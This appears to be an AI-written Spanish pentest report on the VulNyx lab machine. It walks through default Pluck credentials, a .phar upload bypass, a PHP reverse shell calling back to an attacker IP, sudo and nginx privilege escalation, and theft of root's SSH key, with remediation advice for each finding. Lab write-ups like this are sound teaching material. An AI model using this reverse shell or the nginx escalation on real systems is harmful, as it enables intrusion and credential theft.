¡Absolutamente! Con gusto me pongo mi sombrero de experto en pentesting y documentación para presentar un informe técnico exhaustivo basado en los hallazgos proporcionados. La documentación de seguridad es tan crítica como el propio descubrimiento de las vulnerabilidades. A continuación, encontrará un informe de evaluación de seguridad profesional, presentado en formato HTML, que detalla la metodología, los hallazgos y las recomendaciones para el sistema \*\*VulNyx\*\*. \`\`\`html <!DOCTYPE html>

# Informe de Evaluación de Seguridad  
Sistema VulNyx

**Fecha del informe:** 1 de Septiembre de 2025

**Auditor:** \[Su Nombre/Organización\]

**Alcance:** Evaluación de seguridad de la máquina virtual "VulNyx" (192.168.1.56).

## 1\. Resumen Ejecutivo

El presente informe detalla los hallazgos de una evaluación de seguridad realizada sobre el sistema VulNyx, identificado con la dirección IP 192.168.1.56\. El objetivo principal fue identificar y explotar vulnerabilidades que pudieran comprometer la confidencialidad, integridad y disponibilidad del sistema, culminando en un acceso de escalada de privilegios a nivel de `root`.

La evaluación reveló una serie de vulnerabilidades críticas, incluyendo el uso de credenciales por defecto, una vulnerabilidad de carga de archivos arbitraria, y configuraciones inadecuadas de `sudo`, que colectivamente permitieron obtener acceso completo al sistema.

## 2\. Metodología

La auditoría se realizó siguiendo una metodología estándar de pentesting, que abarca las siguientes fases:

* **Reconocimiento y Escaneo:** Identificación de activos, puertos abiertos y servicios en ejecución.
* **Enumeración:** Recopilación detallada de información sobre los servicios identificados, versiones, directorios web y posibles puntos de entrada.
* **Explotación Inicial:** Obtención de acceso inicial al sistema con privilegios limitados.
* **Escalada de Privilegios:** Aumento de los privilegios del usuario comprometido para obtener acceso de `root`.
* **Post-Explotación:** Recolección de artefactos clave (flags) y documentación de los hallazgos.

## 3\. Hallazgos Detallados

### 3.1\. Fase de Reconocimiento y Escaneo

Se inició la evaluación con un escaneo de red para identificar el objetivo dentro del segmento local. La herramienta `netdiscover` confirmó la dirección IP del sistema objetivo.

```
netdiscover -r 192.168.1.0/24
```

Posteriormente, se realizó un escaneo de puertos exhaustivo utilizando `nmap` para identificar servicios expuestos. El uso de `--min-rate 5000` acelera el escaneo al sacrificar precisión, mientras que `-sS` realiza un escaneo SYN sigiloso, `-n` evita la resolución DNS y `-Pn` asume que el host está activo.

```
nmap -p- --open --min-rate 5000 -sS -n -Pn 192.168.1.56 -oN firstNmap.txt
```

Los resultados iniciales revelaron los siguientes puertos abiertos:

* `22/tcp`: SSH
* `80/tcp`: HTTP

Un escaneo más detallado con detección de versiones y scripts (`-sVC`) proporcionó información adicional sobre los servicios:

```
nmap -p 22,80 -sVC 192.168.1.56 -oN secondNmap.txt
```

**Nota:** Aunque el informe no incluye los resultados exactos del segundo Nmap, se asume que confirmó las versiones y configuraciones de los servicios SSH y HTTP, sentando las bases para la siguiente fase.

### 3.2\. Fase de Enumeración

#### 3.2.1\. Descubrimiento de Directorios Web (HTTP - Puerto 80)

Se utilizó `dirb` para enumerar directorios y archivos en el servidor web, buscando puntos de entrada o aplicaciones web interesantes.

```
dirb http://192.168.1.56 /usr/share/wordlists/big.txt -o dirb.txt
```

La enumeración reveló el directorio `/pluck`, que alojaba una aplicación web.

![Pluck Web Application](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/pluck_web.png) 

Dentro de la aplicación Pluck, se identificó un panel de inicio de sesión.

![Pluck Login Page](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/pluck_login.png) 

#### 3.2.2\. Vulnerabilidad: Credenciales por Defecto (Pluck CMS) (Severidad: Alta)

Se intentaron credenciales por defecto comunes para la autenticación en el panel de Pluck CMS. Las credenciales `admin:admin` resultaron ser válidas, otorgando acceso completo al panel de administración.

![Admin Logged In](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/admin_logued.png) 

**Recomendación:** Es crítico cambiar todas las credenciales por defecto inmediatamente después de la instalación de cualquier aplicación. Implementar una política de contraseñas robusta, con requisitos de complejidad y longitud, y considerar la autenticación de dos factores (2FA).

### 3.3\. Fase de Explotación Inicial

#### 3.3.1\. Vulnerabilidad: Carga de Archivos Arbitrarios (Arbitrary File Upload) con Bypass de Extensión (Severidad: Alta)

Dentro del panel de administración de Pluck, se exploró la funcionalidad de "subir módulos", que resultó ser un camino sin éxito para la carga de shells PHP debido a validaciones estrictas de tipo de archivo.

![Upload Modules](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/uploadModules.png) ![Error Uploading Shell PHP](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/errorUploading_shellphp.png) 

Sin embargo, se descubrió una funcionalidad de carga de archivos que, aunque inicialmente añadía la extensión `.txt` a los archivos `.php` subidos, presentaba una oportunidad para un bypass.

![RFI Vulnerability](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/rfi.png) 

Mediante pruebas de diferentes extensiones de archivos PHP, se encontró que el servidor permitía la carga de archivos con la extensión `.phar` sin modificarla. Esto permitió subir una shell inversa PHP con la función `system()`, ya que `exec()` no era reconocida, indicando posibles restricciones en las funciones del sistema.

El contenido de la shell inversa fue:

```
<?php system("bash -c 'bash -i >&dev/tcp/192.168.1.100/443 0>&1'"); ?>
```

Tras la carga exitosa del archivo `shell.phar`, se ejecutó la shell inversa a través de una solicitud HTTP a la URL del archivo cargado. Esto otorgó acceso al sistema como el usuario `www-data`.

![RCE whoami](https://private-user-images.githubusercontent.com/82893511/400529265-f4c31131-c4b4-42a7-ac42-613559503b7d.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTY3NTAwMDUsIm5iZiI6MTc1Njc0OTcwNSwicGF0aCI6Ii84Mjg5MzUxMS80MDA1MjkyNjUtZjRjMzExMzEtYzRiNC00MmE3LWFjNDItNjEzNTU5NTAzYjdkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MDElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTAxVDE4MDE0NVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ1ZTA1YWY0MDk0MTU4MjZjOWJhMGQ4M2EzNTEwOGJkNTFkZjRhOWE0YjRiMDljZTE5MjcwODEzZmNmM2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.RRFVYZo_eh-OEbSWIYYEDPV-X3-aWk5SIyCvPVWF_as) ![Remote Shell Executed](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/remoteShell_executed.png) 

**Recomendación:** Implementar validación estricta de carga de archivos basada en una lista blanca (whitelist) de extensiones y tipos MIME permitidos. Mover el directorio de carga de archivos fuera del directorio raíz web. Configurar el servidor web para no ejecutar scripts en directorios de carga. Revisar las funciones PHP deshabilitadas (`disable_functions`) para mitigar la ejecución de comandos del sistema.

### 3.4\. Fase de Escalada de Privilegios

#### 3.4.1\. Escalada de `www-data` a `dave` mediante configuración Sudo (Severidad: Alta)

Una vez dentro como `www-data`, se procedió a buscar vectores para la escalada de privilegios. La revisión de los permisos `sudo` del usuario `www-data` reveló que podía ejecutar `bash` como el usuario `dave` sin necesidad de contraseña.

```
sudo -l
```

![Sudo -l Output](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/sudo-l.png) 

Esto permitió una escalada directa al usuario `dave`.

```
sudo -u dave bash
```

![Dave Escalated](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/dave_escalated.png) 

Se obtuvo la primera flag de usuario (`user.txt`).

![User Flag](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/user_flag.png) 

**Recomendación:** Revisar el archivo `/etc/sudoers` para aplicar el principio de mínimo privilegio. Evitar la configuración `NOPASSWD` para comandos que puedan llevar a la obtención de una shell o a la ejecución arbitraria de comandos, especialmente para usuarios con acceso a recursos críticos.

#### 3.4.2\. Escalada de `dave` a `root` mediante manipulación de Nginx y filtración de clave SSH (Severidad: Crítica)

Como usuario `dave`, se examinaron nuevamente los permisos `sudo`. Se descubrió que `dave` podía ejecutar el binario de Nginx como `root` sin contraseña.

```
sudo -l
```

![Nginx Manual Page](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/nginx_man.png) 

La opción `-c` de Nginx permite cargar un archivo de configuración alternativo, lo cual es un vector de escalada significativo cuando se combina con permisos `sudo`. Se creó un archivo de configuración personalizado para Nginx (`newConfigNginx`) para listar archivos del sistema de archivos como `root`. Inicialmente, se intentó activar PHP para Nginx bajo el usuario `root`, pero no fue exitoso.

La estrategia se cambió para utilizar Nginx como un servidor de archivos arbitrario, apuntando a directorios sensibles. Una configuración modificada que establece el usuario a `root` y el directorio raíz a `/root` es particularmente peligrosa.

```
user root;
server {
   listen [::]:65000 default_server;
   server_name _;
   root /root;
   index index.html index.htm index.nginx-debian-html;
   location / {
           try_files $uri $uri/ =404;
   }
}
```

Se detuvo el servicio Nginx original y se inició con la configuración personalizada.

```
sudo nginx -s quit
sudo nginx -c /home/dave/newConfigNginx
```

![New Nginx Config](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/newNginx_conf.png) 

Accediendo al puerto 65000 configurado en Nginx desde la máquina atacante, se pudo listar y acceder a archivos dentro del directorio `/root`.

![Seeing BashRC Root Nginx](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/seeing_bashrc_root_nginx.png) 

Se buscó la clave privada SSH de `root` (`id_rsa`) dentro del directorio `/root`, la cual fue exitosamente recuperada a través del servidor web mal configurado.

![id_rsa Root](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/id_rsa_root.png) 

Al intentar utilizar la clave `id_rsa` para acceder vía SSH como `root`, se solicitó una frase de contraseña (passphrase).

![Passphrase Wrong](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/passphrase_wrong.png) 

Se intentó crackear la passphrase usando `ssh2john` y `john the ripper`, pero no se encontró la contraseña en las wordlists comunes.

La investigación continuó en el sistema comprometido. Se buscó archivos que pudieran contener la passphrase usando el comando `find`.

```
find / -name "*pass*" 2>/dev/null
```

Se localizó un archivo llamado `pas.php` en `/var/www/html/pluck/data/settings/pas.php`, el cual contenía la passphrase.

![Root Creds Posible](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/root_credsPosible.png) 

Con la passphrase recuperada, se pudo autenticar exitosamente vía SSH como `root`.

![Root Shell](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/root_shell.png) 

Finalmente, se obtuvo la flag de `root` (`root.txt`).

![Root Flag](https://github.com/Koh4kU/Writeups/raw/main/Vulnyx/Code/Content/root_flag.png) 

**Recomendación:** 
* **Configuración de Sudo:** Restringir estrictamente los permisos `sudo` para el binario de Nginx. Si es necesario ejecutar Nginx como `root`, usar wrappers seguros que impidan la manipulación de argumentos peligrosos como `-c`.
* **Permisos de Archivos Sensibles:** Asegurar que los archivos de claves privadas SSH (`id_rsa`) y otros archivos críticos del sistema tengan permisos de lectura y escritura extremadamente restrictivos (e.g., `600`) y sean propiedad del usuario correcto (e.g., `root:root`).
* **Gestión de Contraseñas:** No almacenar contraseñas o passphrases en archivos legibles por el servidor web o en ubicaciones predecibles. Implementar soluciones seguras para la gestión de secretos.
* **Configuración de SSH:** En `/etc/ssh/sshd_config`, considerar deshabilitar el inicio de sesión directo de `root` (`PermitRootLogin no`) y/o requerir passphrases robustas para claves SSH.

## 4\. Conclusión

La evaluación de seguridad del sistema VulNyx ha revelado una cadena de vulnerabilidades que van desde credenciales por defecto en una aplicación web hasta configuraciones de permisos inadecuadas en `sudo` y el servidor Nginx, permitiendo el compromiso completo del sistema a nivel de `root`.

Es imperativo abordar estas vulnerabilidades con prioridad para proteger la integridad y confidencialidad del sistema. Se recomienda implementar todas las medidas correctivas sugeridas para mitigar estos riesgos y fortalecer la postura de seguridad de la infraestructura.

Atentamente,  
El Equipo de Pentesting

\`\`\`